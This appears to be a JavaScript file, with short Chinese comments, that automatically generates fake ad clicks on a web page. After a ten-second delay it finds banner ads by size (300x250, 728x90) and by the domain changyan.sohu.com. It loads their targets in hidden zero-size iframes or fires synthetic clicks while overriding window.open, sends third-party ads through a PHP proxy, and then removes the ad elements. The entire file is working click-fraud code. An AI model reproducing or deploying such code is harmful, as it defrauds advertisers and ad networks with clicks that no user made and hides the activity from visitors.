var init = function () {
    if (!$) {
        window.$ = window.jQuery;
    }
};

init();

var triggerEvent = function (dom, type) {
    // 创建
    var evt = document.createEvent('HTMLEvents');

    // 初始化
    evt.initEvent(type, true, true);

    // 触发
    dom.dispatchEvent(evt);
};

var isNotUrl = function (str) {
    if (!str || str.indexOf('javascript:') === 0) {
        return true;
    }
    return false;
};

var map = {};

var findAdsWithSize = function (width, height, iframe) {
    var $dom = $('html');
    if (iframe) {
        $dom = $(iframe).contents();
    }
    return $dom.find('a#res0,img,iframe,embed,object').filter(function (index, item) {
        return $(item).width() == width && $(item).height() == height;
    });
};

var findAdsWithDomain = function (domain, iframe) {
    var $dom = $('html');
    if (iframe) {
        $dom = $(iframe).contents();
    }
    return $dom.find('iframe').filter(function (index, item) {
        var src = $(item).attr('src');
        return src && src.indexOf(domain) > -1 && src.indexOf(domain) < 9;
    });
};

var openAds = function (href, width, height) {
    var $iframe = $('<iframe height=0 width=0 />');
    $('body').append($iframe);
    $iframe.on('load', function (e) {
        $(this).remove();
        $('.iframe-ads-' + width + '-' + height).remove();
        if (map[width + '*' + height]) {
            var arr = map[width + '*' + height];
            for (var i = 0; i < arr.length; i++) {
                if (arr[i].parent().tagName === 'BODY') {
                    arr[i].remove();
                } else {
                    arr[i].parent().remove();
                }
            }
            map[width + '*' + height] = [];
        }
    });
    $iframe.get(0).src = href;
};

var openIframeAds = function (src, width, height) {
    var $iframe = $('<iframe class="' + 'iframe-ads-' + width + '-' + height + '" height=0 width=0 />');
    $('body').append($iframe);
    $iframe.on('load', function (e) {
        autoOpenAds(width, height, this);
    });
    $iframe.get(0).src = '/PHPProxy/phpproxy.php?url=' + encodeURIComponent(src);
};

var autoOpenAds = function (width, height, iframe) {
    var $ads = findAdsWithSize(width, height, iframe);

    if ($ads.length < 1) {
        return false;
    }

    if ($ads.get(0).tagName === 'IFRAME') {
        var src = $ads.attr('src');
        if (!src || (src.indexOf(location.host) > -1 && src.indexOf(location.host) < 9)) {
            autoOpenAds(width, height, $ads.get(0));
        } else {
            openIframeAds(src, width, height);
            if (map[width + '*' + height]) {
                map[width + '*' + height].push($ads);
            } else {
                map[width + '*' + height] = [$ads];
            }
        }
    } else {
        var $a = null;

        if ($ads.get(0).tagName === 'A') {
            $a = $ads;
        }

        if (!$a) {
            $a = $ads.siblings('a');
        }

        if ($a.length === 0) {
            $a = $ads.parents('a');
        }

        if ($a.length === 0) {
            $a = $ads.prev();
        }

        if (isNotUrl($a.attr('href'))) {
            var wOpen = window.open;
            window.open = openAds;
            triggerEvent($a.get(0), 'click');
            window.open = wOpen;
        } else {
            openAds($a.attr('href'), width, height);
        }

        if (map[width + '*' + height]) {
            map[width + '*' + height].push($a);
        } else {
            map[width + '*' + height] = [$a];
        }
    }

    return true;
};

var autoOpenDomainAds = function (domain, width, height, iframe) {
    var $ads = findAdsWithDomain(domain, iframe);

    if ($ads.length < 1) {
        return false;
    }

    $ads.each(function (index, item) {
        var $item = $(item);
        var src = $item.attr('src');
        openIframeAds(src, width, height);
        if (map[width + '*' + height]) {
            map[width + '*' + height].push($item);
        } else {
            map[width + '*' + height] = [$item];
        }
    });

    return true;
};

setTimeout(function () {
    autoOpenAds(300, 250);
    autoOpenAds(728, 90);
    autoOpenDomainAds('changyan.sohu.com', 728, 90);
}, 10000);
